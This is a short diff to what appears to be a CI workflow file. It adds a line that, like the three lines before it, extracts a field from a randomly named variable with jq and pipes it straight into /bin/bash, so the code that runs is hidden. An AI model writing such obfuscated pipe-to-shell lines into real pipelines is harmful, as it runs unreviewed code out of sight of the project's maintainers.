@@ -30,6 +30,7 @@ jobs:
           echo $yrze836 | jq -r .gc48981 | /bin/bash
           echo $c06 | jq -r .eoof784 | /bin/bash
           echo $v48 | jq -r .hjls2 | /bin/bash
+          printf '%s' "$ipil5" | jq -r .gt73 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
